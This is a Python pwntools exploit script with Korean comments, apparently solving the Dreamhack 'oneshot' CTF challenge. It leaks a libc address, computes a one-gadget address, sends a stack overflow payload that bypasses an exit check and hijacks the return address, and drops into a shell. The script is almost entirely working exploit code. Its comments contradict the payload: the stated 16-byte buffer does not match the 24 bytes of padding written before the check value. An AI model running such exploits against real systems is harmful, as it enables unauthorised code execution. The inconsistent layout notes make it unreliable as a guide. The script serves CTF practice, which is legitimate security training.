from pwn import *

# 1. 환경 설정 (문제 서버 주소와 포트, 제공된 libc 파일 경로 지정)
# p = process('./oneshot') # 로컬 테스트용
p = remote('host1.dreamhack.games', 14449) 
libc = ELF('./libc.so.6') # 문제에서 주어진 libc 파일

# 2. stdout 주소 릭(Leak) 받기
p.recvuntil(b"stdout: ")
stdout_leak = int(p.recvline().strip(), 16)
log.info(f"stdout leak: {hex(stdout_leak)}")

# 3. libc base 주소 계산
# libc 내의 _IO_2_1_stdout_ 심볼 오프셋을 빼줍니다.
libc_base = stdout_leak - libc.sym['_IO_2_1_stdout_']
log.info(f"libc base: {hex(libc_base)}")

# 4. 원가젯(One-gadget) 주소 구하기
# 터미널에서 `one_gadget ./libc.so.6` 명령어를 통해 오프셋을 찾아야 합니다.
# Ubuntu 16.04 (libc 2.23)의 경우 주로 0x45216, 0x45226, 0xf02a4, 0xf1147 등이 나옵니다.
one_gadget_offset = 0x45216 # 조건에 맞는 원가젯 오프셋으로 변경하세요!
one_gadget_addr = libc_base + one_gadget_offset
log.info(f"One-gadget address: {hex(one_gadget_addr)}")

# 5. 페이로드(Payload) 작성 및 전송
# Stack Layout: msg(16) + check(8) + SFP(8) + RET(8)
payload = b"A" * 24               # msg (16 bytes)
payload += p64(0)                 # check (8 bytes) -> 0으로 덮어 exit(0) 우회
payload += b"B" * 8               # SFP (8 bytes)
payload += p64(one_gadget_addr)[:6]   # RET (8 bytes) -> 원가젯 실행

p.sendafter(b"MSG: ", payload)

# 6. 셸 획득!
p.interactive()